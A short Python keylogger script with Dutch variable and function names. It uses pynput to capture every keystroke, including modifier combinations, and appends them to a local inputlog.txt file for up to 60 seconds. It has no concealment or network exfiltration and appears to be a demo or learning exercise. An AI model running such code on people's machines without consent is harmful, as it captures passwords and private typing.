import time
from pynput import keyboard

SPECIALE_KEYS = {
    "Key.space": " ", "Key.enter": "[ENTER]\n", "Key.backspace": "[BACKSPACE]",
    "Key.shift": "[SHIFT]", "Key.ctrl": "[CTRL]", "Key.alt": "[ALT]",
    "Key.tab": "[TAB]", "Key.esc": "[ESC]"
}

mods, buffer = set(), []
BUF_GROOTTE, FLUSH_TIJD, MAX_TIJD, start = 20, 5, 60, time.time()

def log_input(toets):
    try:
        t = SPECIALE_KEYS.get(str(toets).replace("'", ""), str(toets).replace("'", ""))
        if mods:
            t = "+".join(sorted(mods)) + f"+{t}"
        buffer.append(t)
        if len(buffer) >= BUF_GROOTTE:
            save()
    except Exception as e:
        print(f"error: {e}")

def bij_klik(toets):
    try:
        t = str(toets).replace("'", "")
        if t in {"Key.shift", "Key.ctrl", "Key.alt"}:
            mods.add(t)
        else:
            log_input(toets)
    except Exception as e:
        print(f"error: {e}")

def bij_los(toets):
    try:
        mods.discard(str(toets).replace("'", ""))
        if MAX_TIJD and (time.time() - start) > MAX_TIJD:
            save()
            return False
    except Exception as e:
        print(f"error: {e}")

def save():
    if buffer:
        with open("inputlog.txt", "a") as f:
            f.write(" ".join(buffer) + "\n")
        buffer.clear()

def start_ding():
    with keyboard.Listener(on_press=bij_klik, on_release=bij_los) as l:
        try:
            while not (MAX_TIJD and (time.time() - start) > MAX_TIJD):
                time.sleep(FLUSH_TIJD)
                save()
        except KeyboardInterrupt:
            save()
            print("\nYo klaar.")

if __name__ == "__main__":
    start_ding()

